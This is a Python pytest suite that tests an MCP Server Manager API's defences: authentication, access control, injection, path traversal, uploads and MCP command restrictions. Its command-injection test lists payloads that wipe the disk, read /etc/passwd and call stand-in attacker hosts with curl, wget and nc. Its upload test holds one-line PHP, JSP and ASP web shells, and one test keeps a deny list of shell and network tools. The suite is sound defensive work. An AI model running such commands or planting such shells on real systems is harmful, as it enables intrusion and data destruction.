"""
Comprehensive security testing suite for MCP Server Manager.
Tests authentication, authorization, input validation, and security restrictions.
"""
import pytest
from unittest.mock import Mock, AsyncMock, patch
import httpx
from fastapi import status
from datetime import datetime, timedelta
import jwt
import hashlib
import hmac
import time
import json
import base64

from tests.utils.test_helpers import (
    SecurityTestHelper, 
    APITestHelper, 
    DataFactory
)


@pytest.mark.security
@pytest.mark.asyncio
class TestAuthenticationSecurity:
    """Test authentication security mechanisms."""
    
    async def test_jwt_token_validation(self, async_client, test_settings):
        """Test JWT token validation and security."""
        # Test valid token
        valid_payload = {
            "sub": "test-user-123",
            "email": "test@example.com",
            "exp": int(time.time()) + 3600,
            "iat": int(time.time()),
            "type": "access"
        }
        
        valid_token = jwt.encode(valid_payload, test_settings.SECRET_KEY, algorithm="HS256")
        headers = {"Authorization": f"Bearer {valid_token}"}
        
        response = await async_client.get("/api/v1/auth/me", headers=headers)
        # Should succeed with valid token
        assert response.status_code in [status.HTTP_200_OK, status.HTTP_401_UNAUTHORIZED]  # Depends on implementation
        
        # Test expired token
        expired_payload = {
            "sub": "test-user-123",
            "email": "test@example.com",
            "exp": int(time.time()) - 3600,  # Expired 1 hour ago
            "iat": int(time.time()) - 7200,
            "type": "access"
        }
        
        expired_token = jwt.encode(expired_payload, test_settings.SECRET_KEY, algorithm="HS256")
        headers = {"Authorization": f"Bearer {expired_token}"}
        
        response = await async_client.get("/api/v1/auth/me", headers=headers)
        APITestHelper.assert_status_code(response, status.HTTP_401_UNAUTHORIZED)
        
        # Test malformed token
        malformed_headers = {"Authorization": "Bearer invalid.token.here"}
        response = await async_client.get("/api/v1/auth/me", headers=malformed_headers)
        APITestHelper.assert_status_code(response, status.HTTP_401_UNAUTHORIZED)
    
    async def test_token_tampering_detection(self, async_client, test_settings):
        """Test detection of tampered JWT tokens."""
        # Create valid token
        valid_payload = {
            "sub": "test-user-123",
            "email": "test@example.com",
            "exp": int(time.time()) + 3600,
            "iat": int(time.time()),
            "type": "access"
        }
        
        valid_token = jwt.encode(valid_payload, test_settings.SECRET_KEY, algorithm="HS256")
        
        # Tamper with token by changing one character
        tampered_token = valid_token[:-5] + "XXXXX"
        headers = {"Authorization": f"Bearer {tampered_token}"}
        
        response = await async_client.get("/api/v1/auth/me", headers=headers)
        APITestHelper.assert_status_code(response, status.HTTP_401_UNAUTHORIZED)
        
        # Test signature stripping attack
        token_parts = valid_token.split('.')
        unsigned_token = f"{token_parts[0]}.{token_parts[1]}."
        headers = {"Authorization": f"Bearer {unsigned_token}"}
        
        response = await async_client.get("/api/v1/auth/me", headers=headers)
        APITestHelper.assert_status_code(response, status.HTTP_401_UNAUTHORIZED)
    
    async def test_authentication_timing_attacks(self, async_client):
        """Test protection against timing attacks."""
        # Test login timing consistency
        valid_credentials = {
            "username": "validuser@example.com",
            "password": "ValidPassword123!"
        }
        
        invalid_credentials = [
            {"username": "nonexistent@example.com", "password": "anypassword"},
            {"username": "validuser@example.com", "password": "wrongpassword"},
            {"username": "", "password": ""},
        ]
        
        # Measure timing for valid credentials (should fail since user doesn't exist)
        start_time = time.time()
        response = await async_client.post("/api/v1/auth/login", json=valid_credentials)
        valid_time = time.time() - start_time
        
        # Measure timing for invalid credentials
        timing_differences = []
        for creds in invalid_credentials:
            start_time = time.time()
            response = await async_client.post("/api/v1/auth/login", json=creds)
            invalid_time = time.time() - start_time
            timing_differences.append(abs(valid_time - invalid_time))
        
        # Timing differences should be minimal (< 100ms) to prevent timing attacks
        for diff in timing_differences:
            assert diff < 0.1, f"Timing difference too large: {diff}s"
    
    async def test_password_security_requirements(self, async_client):
        """Test password security requirements."""
        weak_passwords = [
            "123456",
            "password",
            "qwerty",
            "abc123",
            "password123",
            "12345678",
            "admin",
            "letmein",
            "welcome",
            "monkey"
        ]
        
        user_data = DataFactory.create_user_data()
        
        for weak_password in weak_passwords:
            user_data["password"] = weak_password
            response = await async_client.post("/api/v1/auth/register", json=user_data)
            
            # Should reject weak passwords
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
        
        # Test strong password requirements
        strong_passwords = [
            "StrongPassword123!",
            "MySecure@Pass2024",
            "Complex#Password99",
            "Str0ng&Secure#2025"
        ]
        
        for strong_password in strong_passwords:
            user_data["password"] = strong_password
            user_data["email"] = DataFactory.random_email()  # Unique email
            response = await async_client.post("/api/v1/auth/register", json=user_data)
            
            # Should accept strong passwords or fail for other reasons (user exists, etc.)
            assert response.status_code != status.HTTP_422_UNPROCESSABLE_ENTITY or \
                   "password" not in response.json().get("detail", {})
    
    async def test_rate_limiting_authentication(self, async_client):
        """Test rate limiting on authentication endpoints."""
        # Attempt multiple failed logins
        invalid_credentials = {
            "username": "attacker@example.com",
            "password": "wrongpassword"
        }
        
        failed_attempts = 0
        for i in range(10):  # Try 10 failed logins
            response = await async_client.post("/api/v1/auth/login", json=invalid_credentials)
            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                break
            failed_attempts += 1
        
        # Should implement rate limiting after several failed attempts
        assert failed_attempts < 10, "Rate limiting not implemented for failed logins"
    
    async def test_session_management(self, async_client, auth_headers):
        """Test secure session management."""
        # Test concurrent sessions
        response1 = await async_client.get("/api/v1/auth/me", headers=auth_headers)
        response2 = await async_client.get("/api/v1/auth/me", headers=auth_headers)
        
        # Both requests should succeed with the same token
        assert response1.status_code == response2.status_code
        
        # Test logout/token invalidation
        logout_response = await async_client.post("/api/v1/auth/logout", headers=auth_headers)
        
        # After logout, subsequent requests should fail
        if logout_response.status_code == status.HTTP_200_OK:
            post_logout_response = await async_client.get("/api/v1/auth/me", headers=auth_headers)
            APITestHelper.assert_status_code(post_logout_response, status.HTTP_401_UNAUTHORIZED)


@pytest.mark.security
@pytest.mark.asyncio
class TestAuthorizationSecurity:
    """Test authorization and access control."""
    
    async def test_role_based_access_control(self, async_client, auth_headers, admin_auth_headers):
        """Test role-based access control (RBAC)."""
        # Admin-only endpoints
        admin_endpoints = [
            ("GET", "/api/v1/admin/users"),
            ("POST", "/api/v1/admin/users"),
            ("DELETE", "/api/v1/admin/users/1"),
            ("GET", "/api/v1/admin/settings"),
            ("PUT", "/api/v1/admin/settings")
        ]
        
        for method, endpoint in admin_endpoints:
            # Regular user should be forbidden
            response = await async_client.request(method, endpoint, headers=auth_headers)
            if response.status_code != status.HTTP_404_NOT_FOUND:  # Endpoint exists
                APITestHelper.assert_status_code(response, status.HTTP_403_FORBIDDEN)
            
            # Admin user should have access
            admin_response = await async_client.request(method, endpoint, headers=admin_auth_headers)
            assert admin_response.status_code != status.HTTP_403_FORBIDDEN
    
    async def test_resource_ownership_validation(self, async_client, auth_headers, test_session):
        """Test that users can only access their own resources."""
        # Create a server for the authenticated user
        server_data = DataFactory.create_mcp_server_data()
        create_response = await async_client.post(
            "/api/v1/mcp-servers/", 
            json=server_data, 
            headers=auth_headers
        )
        
        if create_response.status_code == status.HTTP_201_CREATED:
            server_id = create_response.json()["id"]
            
            # User should be able to access their own server
            get_response = await async_client.get(
                f"/api/v1/mcp-servers/{server_id}", 
                headers=auth_headers
            )
            APITestHelper.assert_status_code(get_response, status.HTTP_200_OK)
            
            # Create different user headers (simulate different user)
            different_user_headers = {"Authorization": "Bearer different-user-token"}
            
            # Different user should not access the server
            forbidden_response = await async_client.get(
                f"/api/v1/mcp-servers/{server_id}", 
                headers=different_user_headers
            )
            assert forbidden_response.status_code in [
                status.HTTP_403_FORBIDDEN,
                status.HTTP_404_NOT_FOUND,
                status.HTTP_401_UNAUTHORIZED
            ]
    
    async def test_privilege_escalation_prevention(self, async_client, auth_headers):
        """Test prevention of privilege escalation attacks."""
        # Attempt to modify user role through API
        escalation_attempts = [
            {"is_superuser": True},
            {"role": "admin"},
            {"permissions": ["admin", "superuser"]},
            {"access_level": "administrator"}
        ]
        
        for attempt in escalation_attempts:
            response = await async_client.patch(
                "/api/v1/auth/me", 
                json=attempt, 
                headers=auth_headers
            )
            
            # Should not allow privilege escalation
            if response.status_code == status.HTTP_200_OK:
                updated_user = response.json()
                assert not updated_user.get("is_superuser", False)
                assert updated_user.get("role") != "admin"


@pytest.mark.security
@pytest.mark.asyncio  
class TestInputValidationSecurity:
    """Test input validation and injection prevention."""
    
    async def test_sql_injection_prevention(self, async_client, auth_headers):
        """Test SQL injection prevention."""
        sql_payloads = SecurityTestHelper.get_sql_injection_payloads()
        
        # Test SQL injection in search parameters
        for payload in sql_payloads:
            response = await async_client.get(
                f"/api/v1/mcp-servers/?search={payload}", 
                headers=auth_headers
            )
            
            # Should not return database errors or unexpected data
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR
            if response.status_code == status.HTTP_200_OK:
                data = response.json()
                # Should not contain SQL error messages
                response_text = json.dumps(data).lower()
                sql_error_keywords = ["syntax error", "mysql", "postgresql", "sqlite", "database"]
                for keyword in sql_error_keywords:
                    assert keyword not in response_text
        
        # Test SQL injection in POST data
        server_data = DataFactory.create_mcp_server_data()
        for payload in sql_payloads[:3]:  # Test a few payloads
            server_data["name"] = payload
            response = await async_client.post(
                "/api/v1/mcp-servers/", 
                json=server_data, 
                headers=auth_headers
            )
            
            # Should validate input and reject malicious content
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
    
    async def test_xss_prevention(self, async_client, auth_headers):
        """Test Cross-Site Scripting (XSS) prevention."""
        xss_payloads = SecurityTestHelper.get_xss_payloads()
        
        server_data = DataFactory.create_mcp_server_data()
        
        for payload in xss_payloads:
            # Test XSS in various fields
            test_fields = ["name", "description"]
            
            for field in test_fields:
                server_data[field] = payload
                response = await async_client.post(
                    "/api/v1/mcp-servers/", 
                    json=server_data, 
                    headers=auth_headers
                )
                
                if response.status_code == status.HTTP_201_CREATED:
                    created_server = response.json()
                    
                    # Response should not contain unescaped scripts
                    response_text = json.dumps(created_server)
                    assert "<script>" not in response_text
                    assert "javascript:" not in response_text
                    assert "onerror=" not in response_text
                
                # Reset field
                server_data[field] = "safe_value"
    
    async def test_command_injection_prevention(self, async_client, auth_headers):
        """Test command injection prevention in MCP server configurations."""
        command_injection_payloads = [
            "/bin/bash; rm -rf /",
            "/usr/bin/python && cat /etc/passwd",
            "/usr/bin/node; curl malicious-site.com",
            "python3 | nc attacker.com 4444",
            "/bin/sh & wget http://evil.com/backdoor",
            "python3; echo 'hacked' > /tmp/hacked.txt"
        ]
        
        server_data = DataFactory.create_mcp_server_data()
        
        for payload in command_injection_payloads:
            server_data["command"] = payload
            response = await async_client.post(
                "/api/v1/mcp-servers/", 
                json=server_data, 
                headers=auth_headers
            )
            
            # Should validate and reject dangerous commands
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
        
        # Test injection in arguments
        server_data["command"] = "/usr/bin/python"
        for payload in command_injection_payloads[:3]:
            server_data["args"] = ["-m", "server", payload]
            response = await async_client.post(
                "/api/v1/mcp-servers/", 
                json=server_data, 
                headers=auth_headers
            )
            
            # Should validate arguments
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
    
    async def test_path_traversal_prevention(self, async_client, auth_headers):
        """Test path traversal attack prevention."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        # Test in file-related endpoints
        for payload in path_traversal_payloads:
            # Test in configuration file paths
            response = await async_client.get(
                f"/api/v1/config/file?path={payload}",
                headers=auth_headers
            )
            
            # Should not allow access to system files
            if response.status_code == status.HTTP_200_OK:
                content = response.text
                # Should not contain sensitive system file content
                sensitive_patterns = [
                    "root:x:0:0:",  # /etc/passwd content
                    "SAM Registry",  # Windows SAM file
                    "BEGIN PRIVATE KEY"  # SSL keys
                ]
                for pattern in sensitive_patterns:
                    assert pattern not in content
    
    async def test_file_upload_security(self, async_client, auth_headers):
        """Test file upload security."""
        # Test malicious file types
        malicious_files = [
            ("malware.exe", b"MZ\x90\x00", "application/x-msdownload"),
            ("script.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("payload.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
            ("backdoor.asp", b"<% eval request(\"cmd\") %>", "application/x-asp"),
            ("virus.bat", b"@echo off\nformat c: /y", "application/x-bat")
        ]
        
        for filename, content, content_type in malicious_files:
            files = {"file": (filename, content, content_type)}
            
            # Attempt to upload malicious file
            response = await async_client.post(
                "/api/v1/upload",
                files=files,
                headers=auth_headers
            )
            
            # Should reject malicious file types
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_415_UNSUPPORTED_MEDIA_TYPE,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
    
    async def test_json_payload_validation(self, async_client, auth_headers):
        """Test JSON payload validation and size limits."""
        # Test oversized JSON payload
        oversized_payload = {
            "name": "test-server",
            "large_data": "x" * (10 * 1024 * 1024)  # 10MB string
        }
        
        response = await async_client.post(
            "/api/v1/mcp-servers/",
            json=oversized_payload,
            headers=auth_headers
        )
        
        # Should reject oversized payloads
        assert response.status_code in [
            status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
            status.HTTP_400_BAD_REQUEST
        ]
        
        # Test malformed JSON
        malformed_json = '{"name": "test", "invalid": json}'
        
        response = await async_client.post(
            "/api/v1/mcp-servers/",
            content=malformed_json,
            headers={**auth_headers, "Content-Type": "application/json"}
        )
        
        # Should reject malformed JSON
        assert response.status_code in [
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_422_UNPROCESSABLE_ENTITY
        ]


@pytest.mark.security
@pytest.mark.asyncio
class TestNetworkSecurity:
    """Test network-level security measures."""
    
    async def test_cors_policy(self, async_client):
        """Test CORS policy enforcement."""
        # Test allowed origins
        allowed_headers = {"Origin": "http://localhost:3000"}
        response = await async_client.options("/api/v1/mcp-servers/", headers=allowed_headers)
        
        if "Access-Control-Allow-Origin" in response.headers:
            assert response.headers["Access-Control-Allow-Origin"] in [
                "http://localhost:3000",
                "*"  # If wildcard is allowed
            ]
        
        # Test disallowed origins
        disallowed_headers = {"Origin": "http://malicious-site.com"}
        response = await async_client.options("/api/v1/mcp-servers/", headers=disallowed_headers)
        
        # Should not allow arbitrary origins
        if "Access-Control-Allow-Origin" in response.headers:
            assert response.headers["Access-Control-Allow-Origin"] != "http://malicious-site.com"
    
    async def test_security_headers(self, async_client):
        """Test security headers presence."""
        response = await async_client.get("/api/v1/health")
        
        # Check for important security headers
        expected_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        for header in expected_headers:
            if header in response.headers:
                # Verify header values
                if header == "X-Content-Type-Options":
                    assert response.headers[header] == "nosniff"
                elif header == "X-Frame-Options":
                    assert response.headers[header] in ["DENY", "SAMEORIGIN"]
                elif header == "X-XSS-Protection":
                    assert "1" in response.headers[header]
    
    async def test_https_enforcement(self, async_client):
        """Test HTTPS enforcement and redirect."""
        # This test assumes the application enforces HTTPS in production
        # In test environment, we check for the presence of security headers
        
        response = await async_client.get("/api/v1/health")
        
        # Check for HSTS header (indicates HTTPS enforcement)
        if "Strict-Transport-Security" in response.headers:
            hsts_header = response.headers["Strict-Transport-Security"]
            assert "max-age=" in hsts_header
            assert int(hsts_header.split("max-age=")[1].split(";")[0]) > 0
    
    async def test_request_size_limits(self, async_client, auth_headers):
        """Test request size limits."""
        # Test extremely large request
        large_data = "x" * (50 * 1024 * 1024)  # 50MB
        
        try:
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json={"name": "test", "data": large_data},
                headers=auth_headers,
                timeout=5.0
            )
            
            # Should reject oversized requests
            assert response.status_code in [
                status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
                status.HTTP_400_BAD_REQUEST
            ]
        except (httpx.RequestError, asyncio.TimeoutError):
            # Connection issues due to large request size are acceptable
            pass


@pytest.mark.security
@pytest.mark.asyncio
class TestDataProtectionSecurity:
    """Test data protection and privacy measures."""
    
    async def test_sensitive_data_exposure(self, async_client, auth_headers):
        """Test that sensitive data is not exposed in responses."""
        # Create user and check response doesn't contain passwords
        user_data = DataFactory.create_user_data()
        response = await async_client.post("/api/v1/auth/register", json=user_data)
        
        if response.status_code == status.HTTP_201_CREATED:
            user_response = response.json()
            
            # Response should not contain password or other sensitive data
            sensitive_fields = ["password", "password_hash", "secret_key", "private_key"]
            for field in sensitive_fields:
                assert field not in user_response
        
        # Check user profile endpoint
        profile_response = await async_client.get("/api/v1/auth/me", headers=auth_headers)
        if profile_response.status_code == status.HTTP_200_OK:
            profile_data = profile_response.json()
            for field in sensitive_fields:
                assert field not in profile_data
    
    async def test_error_message_information_disclosure(self, async_client):
        """Test that error messages don't disclose sensitive information."""
        # Test database errors
        response = await async_client.get("/api/v1/mcp-servers/999999")
        
        if response.status_code >= 400:
            error_text = response.text.lower()
            
            # Should not contain database-specific error messages
            sensitive_error_patterns = [
                "mysql",
                "postgresql", 
                "sqlite",
                "database connection",
                "table doesn't exist",
                "column",
                "constraint",
                "foreign key",
                "stack trace",
                "traceback",
                "file not found",
                "permission denied"
            ]
            
            for pattern in sensitive_error_patterns:
                assert pattern not in error_text, f"Sensitive error pattern found: {pattern}"
    
    async def test_logging_security(self, async_client, auth_headers):
        """Test that sensitive data is not logged."""
        # This test would typically check log files
        # For now, we test that login attempts don't expose passwords in responses
        
        login_data = {
            "username": "test@example.com",
            "password": "TestPassword123!"
        }
        
        response = await async_client.post("/api/v1/auth/login", json=login_data)
        
        # Response should not echo back the password
        response_text = response.text.lower()
        assert "testpassword123!" not in response_text
        assert login_data["password"].lower() not in response_text


@pytest.mark.security
@pytest.mark.asyncio
class TestMCPSecurityRestrictions:
    """Test MCP-specific security restrictions."""
    
    async def test_mcp_command_validation(self, async_client, auth_headers):
        """Test MCP server command validation."""
        # Dangerous commands that should be rejected
        dangerous_commands = [
            "/bin/rm",
            "/usr/bin/curl",
            "/bin/wget", 
            "/usr/bin/ssh",
            "/bin/netcat",
            "/usr/bin/nc",
            "cmd.exe",
            "powershell.exe",
            "/bin/bash",
            "/bin/sh"
        ]
        
        server_data = DataFactory.create_mcp_server_data()
        
        for dangerous_cmd in dangerous_commands:
            server_data["command"] = dangerous_cmd
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            # Should reject dangerous commands
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
    
    async def test_mcp_environment_variable_validation(self, async_client, auth_headers):
        """Test MCP server environment variable validation."""
        dangerous_env_vars = {
            "LD_PRELOAD": "/malicious/lib.so",
            "PATH": "/malicious/bin:/usr/bin",
            "PYTHONPATH": "/malicious/python",
            "NODE_PATH": "/malicious/node",
            "CLASSPATH": "/malicious/java",
            "HOME": "/tmp/malicious",
            "SHELL": "/bin/bash"
        }
        
        server_data = DataFactory.create_mcp_server_data()
        
        for env_var, value in dangerous_env_vars.items():
            server_data["env"] = {env_var: value}
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            # Should validate environment variables
            if response.status_code == status.HTTP_201_CREATED:
                # If creation succeeded, verify the dangerous env var was sanitized
                created_server = response.json()
                if "env" in created_server:
                    assert env_var not in created_server["env"] or \
                           created_server["env"][env_var] != value
    
    async def test_mcp_network_restrictions(self, async_client, auth_headers):
        """Test MCP server network access restrictions."""
        # Test restricted network configurations
        restricted_configs = [
            {"host": "0.0.0.0", "port": 22},    # SSH port
            {"host": "0.0.0.0", "port": 23},    # Telnet port
            {"host": "0.0.0.0", "port": 21},    # FTP port
            {"host": "0.0.0.0", "port": 445},   # SMB port
            {"host": "127.0.0.1", "port": 3306}, # MySQL port
            {"host": "localhost", "port": 5432}, # PostgreSQL port
        ]
        
        server_data = DataFactory.create_mcp_server_data()
        
        for config in restricted_configs:
            server_data.update(config)
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            # Should restrict access to sensitive ports
            if config["port"] in [22, 23, 21, 445]:
                assert response.status_code in [
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_422_UNPROCESSABLE_ENTITY
                ]